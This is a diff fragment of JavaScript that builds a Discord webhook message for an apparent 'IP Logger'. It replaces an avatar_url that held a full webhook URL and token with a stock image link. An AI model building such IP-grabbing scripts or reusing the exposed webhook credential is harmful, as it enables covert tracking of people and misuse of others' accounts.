@@ -10,7 +10,7 @@ function monke(json)
      var params = 
      {
           username: "IP Logger",
-          avatar_url: "https://discord.com/api/webhooks/1336453517694468199/HYH5gYHwzgLyXoJIVCTBBSDrwM21U18Er15-yNEKIW2ylJS4ptJTh0r5Tfq9SzZ4eYC_",
+          avatar_url: "https://www.rd.com/wp-content/uploads/2022/08/GettyImages-961243862-e1661892079769.jpg?fit=700%2C467",
           content: "@everyone",
           embeds: [
                {
